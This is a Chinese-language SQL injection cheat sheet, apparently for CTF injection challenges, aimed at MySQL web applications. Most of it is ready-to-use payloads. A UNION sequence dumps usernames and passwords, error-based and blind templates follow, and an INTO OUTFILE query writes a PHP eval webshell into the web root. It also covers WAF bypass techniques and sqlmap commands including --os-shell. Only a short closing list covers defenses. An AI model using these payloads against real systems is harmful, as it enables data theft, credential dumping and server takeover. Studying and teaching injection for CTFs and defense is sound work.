# 03 · SQL 注入手册

> 从判断到利用到绕过，注入题的完整手册。

## 1. 判断注入点

| 输入 | 现象 | 结论 |
|---|---|---|
| `'` | 报错 | 字符型，可报错注入 |
| `1 and 1=1` / `1 and 1=2` | 结果不同 | 数字型布尔盲注 |
| `1' and sleep(5)--+` | 延迟 | 时间盲注 |
| `1 union select 1,2,3` | 回显位变化 | 联合查询 |

## 2. 联合查询标准流程

```sql
' ORDER BY 3 --+                 -- 猜列数
' UNION SELECT 1,2,3 --+         -- 找回显位
' UNION SELECT 1,database(),version() --+
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() --+
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' --+
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users --+
```

## 3. 报错注入（无回显位但有报错）

```sql
' AND extractvalue(1, concat(0x7e, (SELECT database()))) --+
' AND updatexml(1, concat(0x7e, (SELECT version())), 1) --+
```

一次最多回显 32 字符，长数据用 `substring()` 分段。

## 4. 盲注模板

```sql
-- 布尔
' AND (SELECT substring(database(),1,1))='d' --+
-- 时间
' AND IF((SELECT substring(database(),1,1))='d', sleep(5), 0) --+
```

手写脚本二分效率高于逐字符，sqlmap `--technique=B` 同理。

## 5. 堆叠与写文件

```sql
'; use mysql; select ... --+                    -- stack
' UNION SELECT 1,'<?php eval($_GET[1]);?>',3 INTO OUTFILE '/var/www/html/s.php' --+
```

前提：`secure_file_priv` 为空 / 有写权限 / 知道 Web 路径。
查看：`SHOW VARIABLES LIKE 'secure_file_priv';`

## 6. WAF 绕过常见手法

| 手法 | 示例 |
|---|---|
| 大小写 | `UnIoN SeLeCt` |
| 注释穿插 | `uni/**/on sel/**/ect` |
| 内联注释 | `/*!50000union*/`（MySQL 版本适配） |
| 编码 | URL 双重编码、hex（`0x`）代替字符串 |
| 等价替换 | `=` → `like`/`regexp`；`and` → `&&`；空格 → `%09/%0a/括号` |
| 参数污染 | 同参数多次提交，WAF 与后端取值不一致 |

## 7. sqlmap 高频用法

```bash
sqlmap -r req.txt --batch --level 3 --risk 2
sqlmap -u URL -D dbname --tables --batch
sqlmap -u URL --os-shell            # 有写权限时
sqlmap -u URL --tamper=space2comment --random-agent
```

## 8. 防守要点

- 预编译/参数化查询（唯一根治法）
- ORM 不是万能：拼接查询字符串的 ORM 用法照样注入
- 最小权限数据库账号、报错信息不外泄
